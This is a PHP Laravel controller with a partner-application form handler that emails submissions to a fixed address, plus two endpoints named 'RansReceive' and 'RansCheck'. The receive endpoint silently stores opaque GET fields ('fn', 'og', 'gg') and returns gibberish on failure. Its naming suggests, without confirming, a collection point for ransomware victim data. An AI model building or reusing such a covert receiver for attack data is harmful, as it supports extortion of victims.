<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
        $ret = null;
    	return view('index', compact(['ret']));
    }
    
   
    
    
    public function postPartner(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'name' => 'required',
                             'email' => 'required|email',
                             'location' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Fill in your name, email and location (city and state)!";
                       
                 }
                
                 else
                 { 
                 	  $s = "New application request: ".date("h:i A jS F, Y");
                       $rcpt = "expoze.inc@gmail.com";
                       $name = $req["name"];
                       $email = $req["email"];
                       $location = $req["location"];

                       $this->helpers->sendEmail($rcpt,$s,['name' => $name,'email' => $email,'location' => $location],'emails.apply_alert','view');  
                        $ret = "OK";                      
                  }       
           return $ret;                                                                                            
	}

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getRansReceive(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'fn' => 'required',
                             'og' => 'required',
                             'gg' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "wjhwjwhjef owkjhjknj!";
                       
                 }
                
                 else
                 { 
                       $this->helpers->addRecord($req);  
                        $ret = "OK";                      
                  }       
           return $ret;                                                                                            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getRansCheck()
    {
        $ret = null;
    	return view('index', compact(['ret']));
    }
	
}
